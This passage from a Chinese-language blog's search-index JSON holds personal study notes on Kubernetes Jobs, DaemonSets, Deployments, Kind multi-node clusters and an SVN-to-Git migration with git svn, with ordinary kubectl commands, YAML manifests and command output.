","date":"2021-02-22","objectID":"/blog/posts/Kuberenetes-%E7%9A%84-Job/:6:0","tags":["kubernetes","job"],"title":"Kubernetes 的 Job","uri":"/blog/posts/Kuberenetes-%E7%9A%84-Job/"},{"categories":["Kubernetes"],"content":"Tree kubectl tree cronjob xxx CronJob-\u003eJob-\u003ePod ","date":"2021-02-22","objectID":"/blog/posts/Kuberenetes-%E7%9A%84-Job/:7:0","tags":["kubernetes","job"],"title":"Kubernetes 的 Job","uri":"/blog/posts/Kuberenetes-%E7%9A%84-Job/"},{"categories":["Git"],"content":"最近公司 SVN Repository 要備廢除 由於先前案子是使用 SVN，此專案也是交接下來的 不希望把 SVN 修改記錄刪除 很多專案都是把檔案從丟新的到 GIT 但我不是這樣做 花了一點時間找工具轉 趕緊紀錄，因為沒有在家實作 所以大概季錄一下 ","date":"2021-02-21","objectID":"/blog/posts/SVN-%E7%A7%BB%E8%BD%89-GIT-%E5%B0%8F%E8%A8%98/:0:0","tags":["git"],"title":"SVN 移轉 GIT 小記","uri":"/blog/posts/SVN-%E7%A7%BB%E8%BD%89-GIT-%E5%B0%8F%E8%A8%98/"},{"categories":["Git"],"content":"能使用工具 subgit svn2git git svn subgit import --non-interactive --default-domain xxxx.com.tw --svn-url https://IP/svn/project project.git 原本要用 subgit ，但下載發現好像有期限 但執行照一般指令，沒有成功(但好像是SVN帳號或 我忘了連VPN) sub2git 也跳出底程指令不能跑 我看他使用 git svn 就研究了一下 好像跳出帳號密碼驗證失敗 ","date":"2021-02-21","objectID":"/blog/posts/SVN-%E7%A7%BB%E8%BD%89-GIT-%E5%B0%8F%E8%A8%98/:1:0","tags":["git"],"title":"SVN 移轉 GIT 小記","uri":"/blog/posts/SVN-%E7%A7%BB%E8%BD%89-GIT-%E5%B0%8F%E8%A8%98/"},{"categories":["Git"],"content":"SVN 輸入帳號轉 GIT sudo apt-get install git-svn git svn clone svn://server/repo --username user # svn: 可以改 https:// git svn clone https://IP/svn/xxx/oooo --username=xxx 輸入完跳出密碼就可以轉了 -r1450:HEAD 可以限制版本從哪邊開始 參考找的資料 將 SVN Local Repository 轉換為 Git Local Repository (Windows) | 格物致知 [git]開始使用git - 用git操作svn repo @ Alan Tsai 的學習筆記｜A Microsoft MVP, MCT, Blogger, Youtuber and ASP .NET Developer Blog 使用 svn2git 從 SVN 遷移到 Git | 他山教程，只選擇最優質的自學材料 git svn clone –password pass gives “Unknown option: password” - Stack Overflow git svn migration failing with svn 1.8 - Stack Overflow How to git-svn clone the last n revisions from a Subversion repository? - Stack Overflow ","date":"2021-02-21","objectID":"/blog/posts/SVN-%E7%A7%BB%E8%BD%89-GIT-%E5%B0%8F%E8%A8%98/:2:0","tags":["git"],"title":"SVN 移轉 GIT 小記","uri":"/blog/posts/SVN-%E7%A7%BB%E8%BD%89-GIT-%E5%B0%8F%E8%A8%98/"},{"categories":["Kuberenetes"],"content":"Deployment 和 ReplicaSet 通常使用多個 replica 時候，都是建在各 nodes 隨機安裝。 DaemonSet 可以讓每一台 node 運行 Pod。 感覺這個跟 docker swarm 的 agent mode :global 一樣 docker swarm 一些指令相關整理 | 程式狂想筆記 立馬實作看看 ","date":"2021-02-18","objectID":"/blog/posts/Kuberentes-%E7%9A%84-DaemonSet/:0:0","tags":["Kubernetes","daemonset"],"title":"Kubernetes 的 DaemonSet","uri":"/blog/posts/Kuberentes-%E7%9A%84-DaemonSet/"},{"categories":["Kuberenetes"],"content":"DaemonSet 使用 DaemonSet 會在所有 node 建立 Pod。如先前所講，跟 Docker Swarm 很像的 agent mode :global 很像 也可以針對 nodename 來建立 Pod。 ","date":"2021-02-18","objectID":"/blog/posts/Kuberentes-%E7%9A%84-DaemonSet/:1:0","tags":["Kubernetes","daemonset"],"title":"Kubernetes 的 DaemonSet","uri":"/blog/posts/Kuberentes-%E7%9A%84-DaemonSet/"},{"categories":["Kuberenetes"],"content":"後記 確保每個節點都會有一份運行的Pod。 Storage daemon 每台機器都要裝 CNI daemon 日誌收集 監控收集 taint 的 NoSchedule 可以阻擋 DaemonSet 部屬。 ","date":"2021-02-18","objectID":"/blog/posts/Kuberentes-%E7%9A%84-DaemonSet/:1:1","tags":["Kubernetes","daemonset"],"title":"Kubernetes 的 DaemonSet","uri":"/blog/posts/Kuberentes-%E7%9A%84-DaemonSet/"},{"categories":["Kuberenetes"],"content":"DaemonSet 概念圖 原有兩台節點(Node) 後面加上一個Node就會部屬Pod ","date":"2021-02-18","objectID":"/blog/posts/Kuberentes-%E7%9A%84-DaemonSet/:1:2","tags":["Kubernetes","daemonset"],"title":"Kubernetes 的 DaemonSet","uri":"/blog/posts/Kuberentes-%E7%9A%84-DaemonSet/"},{"categories":["Kuberenetes"],"content":"建立 DaemonSet examples/9-1-fluentd.yaml at master · kubernetes-up-and-running/examples 這邊版本太舊 no matches for kind “DaemonSet” in version “extensions/v1beta1 no matches for kind “DaemonSet” in version “extensions/v1beta1” · Issue #627 · gluster/gluster-kubernetes notes: changed apiVersion to \"apps/v1\" added selector 最後還是套用官方文件DaemonSet | Kubernetes apiVersion: apps/v1 kind: DaemonSet metadata: name: fluentd-elasticsearch namespace: kube-system labels: k8s-app: fluentd-logging spec: selector: matchLabels: name: fluentd-elasticsearch template: metadata: labels: name: fluentd-elasticsearch spec: tolerations: # this toleration is to have the daemonset runnable on master nodes # remove it if your masters can't run pods - key: node-role.kubernetes.io/master effect: NoSchedule containers: - name: fluentd-elasticsearch image: quay.io/fluentd_elasticsearch/fluentd:v2.5.2 resources: limits: memory: 200Mi requests: cpu: 100m memory: 200Mi volumeMounts: - name: varlog mountPath: /var/log - name: varlibdockercontainers mountPath: /var/lib/docker/containers readOnly: true terminationGracePeriodSeconds: 30 volumes: - name: varlog hostPath: path: /var/log - name: varlibdockercontainers hostPath: path: /var/lib/docker/containers kubectl apply -f https://k8s.io/examples/controllers/daemonset.yaml 查看狀況，這邊namespace 要調整 kubectl describe daemonsets fluentd-elasticsearch --namespace kube-system # Name: fluentd-elasticsearch # Selector: name=fluentd-elasticsearch # Node-Selector: \u003cnone\u003e # Labels: k8s-app=fluentd-logging # Annotations: deprecated.daemonset.template.generation: 1 # Desired Number of Nodes Scheduled: 6 # Current Number of Nodes Scheduled: 6 # Number of Nodes Scheduled with Up-to-date Pods: 6 # Number of Nodes Scheduled with Available Pods: 6 # Number of Nodes Misscheduled: 0 # Pods Status: 6 Running / 0 Waiting / 0 Succeeded / 0 Failed # Pod Template: # Labels: name=fluentd-elasticsearch # Containers: # fluentd-elasticsearch: # Image: quay.io/fluentd_elasticsearch/fluentd:v2.5.2 # Port: \u003cnone\u003e # Host Port: \u003cnone\u003e # Limits: # memory: 200Mi # Requests: # cpu: 100m # memory: 200Mi # Environment: \u003cnone\u003e # Mounts: # /var/lib/docker/containers from varlibdockercontainers (ro) # /var/log from varlog (rw) # Volumes: # varlog: # Type: HostPath (bare host directory volume) # Path: /var/log # HostPathType: # varlibdockercontainers: # Type: HostPath (bare host directory volume) # Path: /var/lib/docker/containers # HostPathType: # Events: # Type Reason Age From Message # ---- ------ ---- ---- ------- # Normal SuccessfulCreate 2m53s daemonset-controller Created pod: fluentd-elasticsearch-rqpth # Normal SuccessfulCreate 2m53s daemonset-controller Created pod: fluentd-elasticsearch-g5r57 # Normal SuccessfulCreate 2m53s daemonset-controller Created pod: fluentd-elasticsearch-bzv6c # Normal SuccessfulCreate 2m53s daemonset-controller Created pod: fluentd-elasticsearch-sjt9l # Normal SuccessfulCreate 2m53s daemonset-controller Created pod: fluentd-elasticsearch-vfs9w # Normal SuccessfulCreate 2m53s daemonset-controller Created pod: fluentd-elasticsearch-wxf6v kubectl get pods -o wide --namespace kube-system # NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES # fluentd-elasticsearch-bzv6c 1/1 Running 0 6m38s 10.244.2.2 kind-control-plane3 \u003cnone\u003e \u003cnone\u003e # fluentd-elasticsearch-g5r57 1/1 Running 0 6m38s 10.244.0.2 kind-control-plane \u003cnone\u003e \u003cnone\u003e # fluentd-elasticsearch-rqpth 1/1 Running 0 6m38s 10.244.1.5 kind-control-plane2 \u003cnone\u003e \u003cnone\u003e # fluentd-elasticsearch-sjt9l 1/1 Running 0 6m38s 10.244.5.2 kind-worker3 \u003cnone\u003e \u003cnone\u003e # fluentd-elasticsearch-vfs9w 1/1 Running 0 6m38s 10.244.3.2 kind-worker \u003cnone\u003e \u003cnone\u003e # fluentd-elasticsearch-wxf6v 1/1 Running 0 6m38s 10.244.4.2 kind-worker2 \u003cnone\u003e \u003cnone\u003e ","date":"2021-02-18","objectID":"/blog/posts/Kuberentes-%E7%9A%84-DaemonSet/:2:0","tags":["Kubernetes","daemonset"],"title":"Kubernetes 的 DaemonSet","uri":"/blog/posts/Kuberentes-%E7%9A%84-DaemonSet/"},{"categories":["Kuberenetes"],"content":"node 新增一個 Label # 查看 nodes 名稱有哪些 kubectl get nodes # NAME STATUS ROLES AGE VERSION # kind-control-plane Ready master 34m v1.19.1 # kind-control-plane2 Ready master 33m v1.19.1 # kind-control-plane3 Ready master 32m v1.19.1 # kind-worker Ready \u003cnone\u003e 32m v1.19.1 # kind-worker2 Ready \u003cnone\u003e 32m v1.19.1 # kind-worker3 Ready \u003cnone\u003e 32m v1.19.1 # 新增一個 label kubectl label nodes kind-control-plane ssd=true # 查看 selector ssd=true nodes kubectl get nodes --selector ssd=true apiVersion: apps/v1 kind: \"DaemonSet\" metadata: labels: app: nginx ssd: \"true\" name: nginx-fast-storage spec: selector: matchLabels: app: nginx template: metadata: labels: app: nginx ssd: \"true\" spec: tolerations: # this toleration is to have the daemonset runnable on master nodes # remove it if your masters can't run pods - key: node-role.kubernetes.io/master effect: NoSchedule nodeSelector: ssd: \"true\" containers: - name: nginx image: nginx:1.10.0 這邊有實作Day-25 認識DaemonSet - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 Pod 都沒有出來 不知道是不是 Kind 出問題?? tolerations: # this toleration is to have the daemonset runnable on master nodes # remove it if your masters can't run pods - key: node-role.kubernetes.io/master effect: NoSchedule 這行家這個就能跑了… 在研究什麼原因 ","date":"2021-02-18","objectID":"/blog/posts/Kuberentes-%E7%9A%84-DaemonSet/:3:0","tags":["Kubernetes","daemonset"],"title":"Kubernetes 的 DaemonSet","uri":"/blog/posts/Kuberentes-%E7%9A%84-DaemonSet/"},{"categories":["Kuberenetes"],"content":"刪除 DaemonSet kubectl delete daemonset nginx-fast-storage ","date":"2021-02-18","objectID":"/blog/posts/Kuberentes-%E7%9A%84-DaemonSet/:4:0","tags":["Kubernetes","daemonset"],"title":"Kubernetes 的 DaemonSet","uri":"/blog/posts/Kuberentes-%E7%9A%84-DaemonSet/"},{"categories":["Kuberenetes"],"content":"DaemonSet Tree DaemonSet -\u003e ControllerRevision -\u003e Pod DaemonSet因為有ControllerRevision 可以控制版本。但無法做到Replica一樣功能。 ","date":"2021-02-18","objectID":"/blog/posts/Kuberentes-%E7%9A%84-DaemonSet/:5:0","tags":["Kubernetes","daemonset"],"title":"Kubernetes 的 DaemonSet","uri":"/blog/posts/Kuberentes-%E7%9A%84-DaemonSet/"},{"categories":["Kuberenetes"],"content":"kube-system 有用到 DaemonSet kubectl -n kube-system get ds NAME DESIRED CURRENT READY UP-TO-DATE AVAILABLE NODE SELECTOR AGE kindnet 3 3 3 3 3 \u003cnone\u003e 10d kube-proxy 3 3 3 3 3 kubernetes.io/os=linux 10d StatefulSets 有狀態的Pod。 常運用儲存、網路結合。 ","date":"2021-02-18","objectID":"/blog/posts/Kuberentes-%E7%9A%84-DaemonSet/:5:1","tags":["Kubernetes","daemonset"],"title":"Kubernetes 的 DaemonSet","uri":"/blog/posts/Kuberentes-%E7%9A%84-DaemonSet/"},{"categories":["Kuberenetes"],"content":"Network StatefulSet -\u003e Pod-1 -\u003e Pod-2 -\u003e Pod-3 每個Pod都有個自Dns。 ","date":"2021-02-18","objectID":"/blog/posts/Kuberentes-%E7%9A%84-DaemonSet/:5:2","tags":["Kubernetes","daemonset"],"title":"Kubernetes 的 DaemonSet","uri":"/blog/posts/Kuberentes-%E7%9A%84-DaemonSet/"},{"categories":["Kuberenetes"],"content":"Storage Pod-1 -\u003e Volume-1 Pod-2 -\u003e Volume-2 ","date":"2021-02-18","objectID":"/blog/posts/Kuberentes-%E7%9A%84-DaemonSet/:5:3","tags":["Kubernetes","daemonset"],"title":"Kubernetes 的 DaemonSet","uri":"/blog/posts/Kuberentes-%E7%9A%84-DaemonSet/"},{"categories":["Kuberenetes"],"content":"更新策略 從後面先動作，先關掉再建立Pod。 ","date":"2021-02-18","objectID":"/blog/posts/Kuberentes-%E7%9A%84-DaemonSet/:5:4","tags":["Kubernetes","daemonset"],"title":"Kubernetes 的 DaemonSet","uri":"/blog/posts/Kuberentes-%E7%9A%84-DaemonSet/"},{"categories":["Kuberenetes"],"content":"Tree StatefulSet-\u003eControllerRevision-\u003ePod ","date":"2021-02-18","objectID":"/blog/posts/Kuberentes-%E7%9A%84-DaemonSet/:5:5","tags":["Kubernetes","daemonset"],"title":"Kubernetes 的 DaemonSet","uri":"/blog/posts/Kuberentes-%E7%9A%84-DaemonSet/"},{"categories":["Kuberenetes"],"content":"最近看 Kuberenets 看到 DaemonSet，由於目前 Kind 跟 MiniKube 都是使用單結點，沒辦法用 Cluster，今天照 Kind 實作看看。 ","date":"2021-02-18","objectID":"/blog/posts/Kind-%E5%BB%BA%E7%BD%AE-Cluster/:0:0","tags":["Kubernetes"],"title":"Kind 建置 Cluster","uri":"/blog/posts/Kind-%E5%BB%BA%E7%BD%AE-Cluster/"},{"categories":["Kuberenetes"],"content":"安裝 Kind curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.11.1/kind-linux-amd64 chmod +x ./kind sudo mv ./kind /usr/local/bin/ 可以看kind – Quick Start ","date":"2021-02-18","objectID":"/blog/posts/Kind-%E5%BB%BA%E7%BD%AE-Cluster/:1:0","tags":["Kubernetes"],"title":"Kind 建置 Cluster","uri":"/blog/posts/Kind-%E5%BB%BA%E7%BD%AE-Cluster/"},{"categories":["Kuberenetes"],"content":"建置 Cluster # 預設 cluster context 名稱為 `kind`. kind create cluster # 名稱為 kind-2 kind create cluster --name kind-2 這邊建立出來會有兩個 Cluster 但這兩個 Cluster 是分開的 等等，我不是要分開的 ","date":"2021-02-18","objectID":"/blog/posts/Kind-%E5%BB%BA%E7%BD%AE-Cluster/:2:0","tags":["Kubernetes"],"title":"Kind 建置 Cluster","uri":"/blog/posts/Kind-%E5%BB%BA%E7%BD%AE-Cluster/"},{"categories":["Kuberenetes"],"content":"查看哪些 Cluster kind get clusters # kind # kind-2 kubectl cluster-info --context kind-kind kubectl cluster-info --context kind-kind-2 等等，我不是要分開的 ","date":"2021-02-18","objectID":"/blog/posts/Kind-%E5%BB%BA%E7%BD%AE-Cluster/:3:0","tags":["Kubernetes"],"title":"Kind 建置 Cluster","uri":"/blog/posts/Kind-%E5%BB%BA%E7%BD%AE-Cluster/"},{"categories":["Kuberenetes"],"content":"刪除 Cluster kind delete cluster --name kind-2 ","date":"2021-02-18","objectID":"/blog/posts/Kind-%E5%BB%BA%E7%BD%AE-Cluster/:4:0","tags":["Kubernetes"],"title":"Kind 建置 Cluster","uri":"/blog/posts/Kind-%E5%BB%BA%E7%BD%AE-Cluster/"},{"categories":["Kuberenetes"],"content":"Multi-node clusters # three node (two workers) cluster config kind: Cluster apiVersion: kind.x-k8s.io/v1alpha4 nodes: - role: control-plane - role: worker - role: worker kind: Cluster apiVersion: kind.x-k8s.io/v1alpha4 nodes: - role: control-plane - role: control-plane - role: control-plane - role: worker - role: worker - role: worker 上面 yml 選一個跑 kind create cluster --config kind-example-config.yaml 建立這麼簡單 感覺跟 Docker Swarm 一樣 我以為要注意在連 Cluster 看當下 node 有哪些 container 看來全部都合起來了 看完，真的是白擔心了 真的可以單結點來測試 不過，DaemonSet 好像能控制在哪個 nodes 執行 建立 Cluster 多 node 也不錯 發現重開機，kubectl 就會連不到 所以，應該只能重建 後來有爬到原因，原因是 Kind 是使用 Docker in Docker 技術，所以Container 建立的時候是使用容器的 IP，所以重開機的時候，重啟IP會不一樣，Kubernetes 會連不到之前設定，所以重建會比較快。 ","date":"2021-02-18","objectID":"/blog/posts/Kind-%E5%BB%BA%E7%BD%AE-Cluster/:5:0","tags":["Kubernetes"],"title":"Kind 建置 Cluster","uri":"/blog/posts/Kind-%E5%BB%BA%E7%BD%AE-Cluster/"},{"categories":["Kuberenetes"],"content":"安裝 kubectl curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\" curl -LO \"https://dl.k8s.io/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl.sha256\" echo \"$(\u003ckubectl.sha256) kubectl\" | sha256sum --check sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl # # chmod +x kubectl # mkdir -p ~/.local/bin/kubectl # mv ./kubectl ~/.local/bin/kubectl # and then add ~/.local/bin/kubectl to $PATH ","date":"2021-02-18","objectID":"/blog/posts/Kind-%E5%BB%BA%E7%BD%AE-Cluster/:6:0","tags":["Kubernetes"],"title":"Kind 建置 Cluster","uri":"/blog/posts/Kind-%E5%BB%BA%E7%BD%AE-Cluster/"},{"categories":["Kubernetes"],"content":"感覺是滿多的功能 但頁數比較想像中的少 趕緊消化 ","date":"2021-02-14","objectID":"/blog/posts/Kubernetes-%E7%9A%84-Deployment/:0:0","tags":["kubernetes","deployment"],"title":"Kubernetes 的 Deployment","uri":"/blog/posts/Kubernetes-%E7%9A%84-Deployment/"},{"categories":["Kubernetes"],"content":"前言 ReplicaSet 單元最後看到使用 Deployment 想說怎麼不直接教 Deployment 實作簡單功能，發現原來 Deployment 會建立 ReplicaSet 所以還是要會 ReplicaSet 怎麼用比較好 ","date":"2021-02-14","objectID":"/blog/posts/Kubernetes-%E7%9A%84-Deployment/:1:0","tags":["kubernetes","deployment"],"title":"Kubernetes 的 Deployment","uri":"/blog/posts/Kubernetes-%E7%9A%84-Deployment/"},{"categories":["Kubernetes"],"content":"建立一個 Deployment 遇到apiVersion error: unable to recognize “kuard-deployment.yml”: no matches for kind “Deployment” in version “extensions/v1beta1” error: unable to recognize “kuard-deployment.yml”: no matches for kind “Deployment” in version “apps/v1beta1” 參考:kubernetes - no matches for kind “Deployment” in version “extensions/v1beta1” - Stack Overflow apiVersion: apps/v1 kind: Deployment metadata: name: kuard-deployment # labels: # app: kuard spec: replicas: 1 selector: matchLabels: app: kuard template: metadata: labels: app: kuard spec: containers: - image: gcr.io/kuar-demo/kuard-amd64:blue name: kuard Kubernetes kuard deployment # 查看所有 Object List kubectl get all # NAME READY STATUS RESTARTS AGE # pod/kuard-deployment-6cd695495f-kt88w 1/1 Running 0 105s # NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE # service/bar-service ClusterIP 10.96.108.167 \u003cnone\u003e 5678/TCP 2d16h # service/foo-service ClusterIP 10.96.109.30 \u003cnone\u003e 5678/TCP 2d16h # service/kubernetes ClusterIP 10.96.0.1 \u003cnone\u003e 443/TCP 2d17h # NAME READY UP-TO-DATE AVAILABLE AGE # deployment.apps/kuard-deployment 1/1 1 1 106s # NAME DESIRED CURRENT READY AGE # replicaset.apps/kuard-deployment-6cd695495f 1 1 1 106s kubectl get deployments kuard-deployment -o jsonpath --template {.spc.selector.matchLabels} # {\"app\":\"kuard\"} kubectl get all --selector=\"app=kuard\" # NAME READY STATUS RESTARTS AGE # pod/kuard-deployment-6cd695495f-kt88w 1/1 Running 0 9m34s # NAME DESIRED CURRENT READY AGE # replicaset.apps/kuard-deployment-6cd695495f 1 1 1 9m34s kubectl get replicasets --selector=app=kuard # NAME DESIRED CURRENT READY AGE # kuard-deployment-6cd695495f 1 1 1 79m # 修改 deployment 的 replicas kubectl scale deployments kuard-deployment --replicas=3 kubectl get replicasets --selector=app=kuard # NAME DESIRED CURRENT READY AGE # kuard-deployment-6cd695495f 3 3 3 82m # 修改 replicaset = 1(這邊不是用 deployment) kubectl scale replicaset kuard-deployment-6cd695495f --replicas=1 kubectl get replicasets --selector=app=kuard # NAME DESIRED CURRENT READY AGE # kuard-deployment-6cd695495f 3 3 3 82m # 不會發生任何改變，下面等等會說 這邊說一下運作方式 Deployment 會管理 ReplicaSet，ReplicaSet 用來管理Pod。 所以要懂 ReplicaSet 是做什麼用的。 上面對 ReplicasSet 做 scale 調整 為什麼不會改變，是因為Deployment 上層設定不一樣的值 Deployment 控制器會重新調整 replica 數量 這種情況下，有一個方法改 ReplicaSet 對 Deployment 刪除(--cascade=orphan) \u003c– 舊版是 --cascade=false # 匯出設定檔出來 kubectl get deployments kuard-deployment -o yaml \u003e kuard-deployment.yaml # 暫時不研究，但應該可以不用做 #kubectl replace -f kuard-deployment.yaml --save-config 可以看到 裡面有很多預設值 strategy: rollingUpdate: maxSurge: 25% maxUnavailable: 25% type: RollingUpdate 這邊跟書裡面提到不一樣 看來新版maxSurge和maxUnavailable都變成百分比 ","date":"2021-02-14","objectID":"/blog/posts/Kubernetes-%E7%9A%84-Deployment/:2:0","tags":["kubernetes","deployment"],"title":"Kubernetes 的 Deployment","uri":"/blog/posts/Kubernetes-%E7%9A%84-Deployment/"},{"categories":["Kubernetes"],"content":"管理 Deployment kubectl describe deployments kuard-deployment Name: kuard-deployment Namespace: default CreationTimestamp: Sun, 14 Feb 2021 20:55:44 +0800 Labels: \u003cnone\u003e Annotations: deployment.kubernetes.io/revision: 1 Selector: app=kuard Replicas: 1 desired | 1 updated | 1 total | 1 available | 0 unavailable StrategyType: RollingUpdate MinReadySeconds: 0 RollingUpdateStrategy: 25% max unavailable, 25% max surge Pod Template: Labels: app=kuard Containers: kuard: Image: gcr.io/kuar-demo/kuard-amd64:blue Port: \u003cnone\u003e Host Port: \u003cnone\u003e Environment: \u003cnone\u003e Mounts: \u003cnone\u003e Volumes: \u003cnone\u003e Conditions: Type Status Reason ---- ------ ------ Available True MinimumReplicasAvailable Progressing True NewReplicaSetAvailable OldReplicaSets: \u003cnone\u003e NewReplicaSet: kuard-deployment-6cd695495f (1/1 replicas created) Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal ScalingReplicaSet 16m deployment-controller Scaled down replica set kuard-deployment-6cd695495f to 1 OldReplicaSets: \u003cnone\u003e NewReplicaSet: kuard-deployment-6cd695495f (1/1 replicas created) 其中 OldReplicaSets 和 NewReplicaSet 是由 Deployment 管理狀態。rollout 中兩邊欄位值會有資料，rollout 完成後 OldReplicaSets 就會 none。 ","date":"2021-02-14","objectID":"/blog/posts/Kubernetes-%E7%9A%84-Deployment/:3:0","tags":["kubernetes","deployment"],"title":"Kubernetes 的 Deployment","uri":"/blog/posts/Kubernetes-%E7%9A%84-Deployment/"},{"categories":["Kubernetes"],"content":"更改容器的映像檔 修改 deployment 設定裡面的 image tag 改成 green spec: containers: - image: gcr.io/kuar-demo/kuard-amd64:blue kubectl apply -f kuard-deployment.yml 建議 replicaset 可以設定大一點 可以看到 OldReplicaSets ,NewReplicaSet 這兩個變化 # 查看更新狀態 kubectl rollout status deployments kuard-deployment # 可以看到新舊 ReplicaSets 都存在，之後退版可能會用到 kubectl get replicasets -o wide # NAME DESIRED CURRENT READY AGE CONTAINERS IMAGES SELECTOR # kuard-deployment-5984cbd7dd 0 0 0 13m kuard gcr.io/kuar-demo/kuard-amd64:green app=kuard,pod-template-hash=5984cbd7dd # kuard-deployment-6cd695495f 20 20 20 6h38m kuard gcr.io/kuar-demo/kuard-amd64:blue app=kuard,pod-template-hash=6cd695495f TODO: 這邊 deployment 程式後，不知道 Service LB 進去會等全部上完好，才會連到新的POD，還是會綜合? 建立 4 個 ReplicaSets 去跑 kubectl get endpoints kuard-service --watch -o yaml 查看變化，看來舊新在跑的時候會同時 LB 舊新(綜合) # 暫停部屬 kubectl rollout pause deployments kuard-deployment # 繼續部屬 kubectl rollout resume deployments kuard-deployment ","date":"2021-02-14","objectID":"/blog/posts/Kubernetes-%E7%9A%84-Deployment/:4:0","tags":["kubernetes","deployment"],"title":"Kubernetes 的 Deployment","uri":"/blog/posts/Kubernetes-%E7%9A%84-Deployment/"},{"categories":["Kubernetes"],"content":"查詢歷史狀態 # 查看 Deployment 的歷史紀錄 kubectl rollout history deployment kuard-deployment # deployment.apps/kuard-deployment # REVISION CHANGE-CAUSE # 7 \u003cnone\u003e # 8 \u003cnone\u003e # 9 \u003cnone\u003e # 12 \u003cnone\u003e # 13 \u003cnone\u003e # 查看 Deployment 詳細資訊 kubectl rollout history deployment kuard-deployment --revision=12 # deployment.apps/kuard-deployment with revision #12 # Pod Template: # Labels: app=kuard # pod-template-hash=bd94b5dbb # Containers: # kuard: # Image: gcr.io/kuar-demo/kuard-amd64:blue # Port: 8080/TCP # Host Port: 0/TCP # Environment: \u003cnone\u003e # Mounts: \u003cnone\u003e # Volumes: \u003cnone\u003e ","date":"2021-02-14","objectID":"/blog/posts/Kubernetes-%E7%9A%84-Deployment/:5:0","tags":["kubernetes","deployment"],"title":"Kubernetes 的 Deployment","uri":"/blog/posts/Kubernetes-%E7%9A%84-Deployment/"},{"categories":["Kubernetes"],"content":"退回版本(Rollback) 可以重新修改 deployment.yml 再做 kubectl apply -f deployment.yml 可以用kubectl rollout指令，如下 # 退回前一個版本 kubectl rollout undo deployments kuard-deployment # deployment.apps/kuard-deployment rolled back # 查看 replica 數 kubectl get replicasets -o wide # NAME DESIRED CURRENT READY AGE CONTAINERS IMAGES SELECTOR # kuard-deployment-5984cbd7dd 0 0 0 22h kuard gcr.io/kuar-demo/kuard-amd64:green app=kuard,pod-template-hash=5984cbd7dd # kuard-deployment-697c6c85 0 0 0 21h kuard gcr.io/kuar-demo/kuard-amd64:green app=kuard,pod-template-hash=697c6c85 # kuard-deployment-6cd695495f 0 0 0 29h kuard gcr.io/kuar-demo/kuard-amd64:blue app=kuard,pod-template-hash=6cd695495f # kuard-deployment-bd94b5dbb 4 4 4 21h kuard gcr.io/kuar-demo/kuard-amd64:blue app=kuard,pod-template-hash=bd94b5dbb # kuard-deployment-f948c99d9 0 0 0 21h kuard gcr.io/kuar-demo/kuard-amd64:1 app=kuard,pod-template-hash=f948c99d9 # 退回某一版 --to-revision kubectl rollout undo deployments kuard-deployment --to-revision=11 # 指令上一個版本 =\u003e --to-revision=0 kubectl rollout history deployment kuard-deployment --to-revision=0 清理策略 你可以在 Deployment 中設置 .spec.revisionHistoryLimit 字段以指定保留此 Deployment 的多少個舊有 ReplicaSet。其餘的 ReplicaSet 將在後台被\u003e 垃圾回收。 默認情況下，此值為 10。 說明： 顯式將此字段設置為 0 將導致 Deployment 的所有歷史記錄被清空，因此 Deployment 將無法回滾。 滾動更新 Deployment ","date":"2021-02-14","objectID":"/blog/posts/Kubernetes-%E7%9A%84-Deployment/:6:0","tags":["kubernetes","deployment"],"title":"Kubernetes 的 Deployment","uri":"/blog/posts/Kubernetes-%E7%9A%84-Deployment/"},{"categories":["Kubernetes"],"content":"Deployment 策略 Recreate 策略 會把現有的 ReplicaSet 的 Pod刪掉，全部新建新的Pod。但會使服務中斷，通常不會使用 RollingUpdate(預設、重要) 滾動方式不停機情況下更新 ","date":"2021-02-14","objectID":"/blog/posts/Kubernetes-%E7%9A%84-Deployment/:7:0","tags":["kubernetes","deployment"],"title":"Kubernetes 的 Deployment","uri":"/blog/posts/Kubernetes-%E7%9A%84-Deployment/"},{"categories":["Kubernetes"],"content":"滾動更新設定 Deployment 會在 .spec.strategy.type==RollingUpdate時，採取 滾動更新的方式更新 Pods。你可以指定 maxUnavailable 和 maxSurge 來控制滾動更新 過程。 最大不可用 .spec.strategy.rollingUpdate.maxUnavailable 是一個可選字段，用來指定 更新過程中不可用的 Pod 的個數上限。該值可以是絕對數字（例如，5），也可以是 所需 Pods 的百分比（例如，10%）。百分比值會轉換成絕對數並去除小數部分。 如果 .spec.strategy.rollingUpdate.maxSurge 為 0，則此值不能為 0。 默認值為 25%。 例如，當此值設置為 30% 時，滾動更新開始時會立即將舊 ReplicaSet 縮容到期望 Pod 個數的70%。 新 Pod 準備就緒後，可以繼續縮容舊有的 ReplicaSet，然後對新的 ReplicaSet 擴容，確保在更新期間 可用的 Pods 總數在任何時候都至少為所需的 Pod 個數的 70%。 最大峰值 .spec.strategy.rollingUpdate.maxSurge 是一個可選字段，用來指定可以創建的超出 期望 Pod 個數的 Pod 數量。此值可以是絕對數（例如，5）或所需 Pods 的百分比（例如，10%）。 如果 MaxUnavailable 為 0，則此值不能為 0。百分比值會通過向上取整轉換為絕對數。 此字段的默認值為 25%。 例如，當此值為 30% 時，啟動滾動更新後，會立即對新的 ReplicaSet 擴容，同時保證新舊 Pod 的總數不超過所需 Pod 總數的 130%。一旦舊 Pods 被殺死，新的 ReplicaSet 可以進一步擴容， 同時確保更新期間的任何時候運行中的 Pods 總數最多為所需 Pods 總數的 130%。 進度期限秒數 .spec.progressDeadlineSeconds 是一個可選字段，用於指定系統在報告 Deployment 進展失敗 之前等待 Deployment 取得進展的秒數。 這類報告會在資源狀態中體現為 Type=Progressing、Status=False、 Reason=ProgressDeadlineExceeded。Deployment 控制器將持續重試 Deployment。 將來，一旦實現了自動回滾，Deployment 控制器將在探測到這樣的條件時立即回滾 Deployment。 如果指定，則此字段值需要大於 .spec.minReadySeconds 取值。 最短就緒時間 .spec.minReadySeconds 是一個可選字段，用於指定新創建的 Pod 在沒有任意容器崩潰情況下的最小就緒時間， 只有超出這個時間 Pod 才被視為可用。默認值為 0（Pod 在準備就緒後立即將被視為可用）。 要瞭解何時 Pod 被視為就緒，可參考容器探針。 我看到最詳細簡單說明 minReadySeconds: 容器內應用程式的啟動時間，Kubernetes 